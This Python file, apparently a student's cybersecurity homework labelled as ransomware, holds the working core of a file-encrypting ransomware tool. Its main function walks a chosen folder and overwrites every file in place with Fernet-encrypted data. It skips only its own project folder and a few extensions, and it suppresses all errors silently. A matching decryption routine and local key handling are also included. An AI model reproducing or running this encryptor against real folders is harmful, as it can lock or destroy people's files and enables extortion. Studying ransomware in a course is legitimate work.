import os
from cryptography.fernet import Fernet

# Define la carpeta contenedora del proyecto
CARPETA_EXCLUIR = "TareaRansomWareCibersec2"

def obtener_carpeta_excluir():
    """
    Obtiene la ruta absoluta de la carpeta a excluir (donde están los scripts).
    """
    ruta_actual = os.path.dirname(os.path.abspath(__file__))
    while True:
        if os.path.basename(ruta_actual) == CARPETA_EXCLUIR:
            return ruta_actual
        nuevo_ruta = os.path.dirname(ruta_actual)
        if nuevo_ruta == ruta_actual:
            break  # No encontrada, retornará la ruta del script actual
        ruta_actual = nuevo_ruta
    return os.path.dirname(os.path.abspath(__file__))

def generar_clave(path="clave.key"):
    clave = Fernet.generate_key()
    with open(path, "wb") as f:
        f.write(clave)
    return clave

def cargar_clave(path="clave.key"):
    with open(path, "rb") as f:
        return f.read()

def encriptar_carpeta(clave, carpeta_usuario):
    fernet = Fernet(clave)
    carpeta_excluir = obtener_carpeta_excluir()
    for dirpath, _, archivos in os.walk(carpeta_usuario):
        dirpath_abs = os.path.abspath(dirpath)
        # Omitir la carpeta del proyecto y subcarpetas
        if dirpath_abs.startswith(carpeta_excluir):
            continue
        for nombre_archivo in archivos:
            ruta = os.path.join(dirpath, nombre_archivo)
            ruta_abs = os.path.abspath(ruta)
            # Omitir archivos importantes (.py, .env, .key, .md, etc)
            if ruta_abs.startswith(carpeta_excluir):
                continue
            if ruta_abs.endswith((".py", ".env", ".key", ".md")):
                continue
            if os.path.isfile(ruta):
                try:
                    with open(ruta, "rb") as file:
                        datos = file.read()
                    datos_enc = fernet.encrypt(datos)
                    with open(ruta, "wb") as file:
                        file.write(datos_enc)
                except Exception:
                    pass

def desencriptar_carpeta(clave, carpeta_usuario):
    fernet = Fernet(clave)
    carpeta_excluir = obtener_carpeta_excluir()
    for dirpath, _, archivos in os.walk(carpeta_usuario):
        dirpath_abs = os.path.abspath(dirpath)
        # Omitir la carpeta del proyecto y subcarpetas
        if dirpath_abs.startswith(carpeta_excluir):
            continue
        for nombre_archivo in archivos:
            ruta = os.path.join(dirpath, nombre_archivo)
            ruta_abs = os.path.abspath(ruta)
            # Omitir archivos importantes (.py, .env, .key, .md, etc)
            if ruta_abs.startswith(carpeta_excluir):
                continue
            if ruta_abs.endswith((".py", ".env", ".key", ".md")):
                continue
            if os.path.isfile(ruta):
                try:
                    with open(ruta, "rb") as file:
                        datos = file.read()
                    datos_dec = fernet.decrypt(datos)
                    with open(ruta, "wb") as file:
                        file.write(datos_dec)
                except Exception:
                    pass
